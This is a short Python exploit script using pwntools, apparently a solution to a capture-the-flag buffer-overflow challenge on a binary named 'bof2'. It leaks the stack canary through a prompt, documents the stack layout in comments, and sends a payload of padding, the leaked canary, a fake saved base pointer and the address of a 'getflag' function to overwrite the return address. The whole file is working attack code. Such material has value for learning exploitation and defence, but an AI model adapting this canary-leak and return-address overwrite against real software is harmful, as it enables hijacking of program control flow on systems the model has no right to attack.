from pwn import *

path = './bof2'
# Open local process for debugging
p = process(path)
# Open the file as a ELF so that we can extract information
# without hardcoding. e.g. we can resolve the address of getflag
# without opening our debugger (ofc, the address will change if the binary is actually a PIE binary)
e = ELF(path)

# + 1 so that we can get rid of the stack misalignment
getflag = e.symbols['getflag'] + 1

p.sendlineafter(":\n", "13")
canary = int(p.recvline())

info("canary = %s"%(hex(canary)))

# Stack Layout

# rbp-0x70 to rbp-0x30 : fib
# rbp-0x30 to rbp-0x10 : buf
# rbp-0x10 to rbp-0x08 : < unused >
# rbp-0x08 to rbp      : canary
# rbp      to rbp+0x08 : saved rbp ptr
# rbp+0x08 to rbp+0x10 : return address

# fill up `buf`
payload = 'a' * 0x20
# fill up till you reach canary
payload += 'a' * 0x8
# write to canary
payload += p64(canary)

# write to rbp
payload += p64(0xdeaddead00000000)
# write to the return address
payload += p64(getflag)

p.sendline(payload)

p.interactive()

